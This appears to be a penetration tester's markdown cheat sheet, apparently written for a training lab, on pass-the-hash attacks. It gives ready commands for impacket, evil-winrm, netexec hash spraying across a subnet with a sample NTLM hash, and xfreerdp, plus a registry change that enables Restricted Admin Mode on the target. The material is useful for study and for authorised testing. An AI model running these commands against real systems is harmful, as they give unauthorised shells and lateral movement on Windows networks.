-- -
### Impacket
Use impacket tools to get a shell. The commands all run the same so just change the binary name and keep everything else the same. 
```bash
impacket-psexec <user>@<ip> -hashes :<hash>
impackket-wmiexec <user>@<ip> -hashes :<hash>
impacket-atexec <user>@<ip> -hashes :<hash>
impacket-smbexec <user>@<ip> -hashes :<hash>
```
### Evil-WinRM
```bash
evil-winrm -i <ip> -u <user> -H <hash>

# for domain account
evil-winrm -i <ip> -u administrator@inlanefreight.htb -H <hash> 
```
### netexec
```bash
# password hash spaying
netexec smb <CIDR range> -u <user> -d <domain> -H <hash> 
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# password hash spraying for local account only, not AD
netexec smb <CDIR range> -u <user> -d <domain> -H <hash> --local-auth

# Execute command
netexec smb <ip> -u <user> -d <domain> -H <hash> -x <cmd> 
```
### xfreerdp
For this to work with a hash, you need to enable `Restricted Admin Mode` in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It is disabled by default. 
```bash
# in cmd on target machine, enable Restriced Admin Mode:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# then just pass the hash
xfreerdp /v:<ip> /u:<user> /pth:<hash> 
```
Remember [[UAC Limits for Local Accounts]] if it isn't working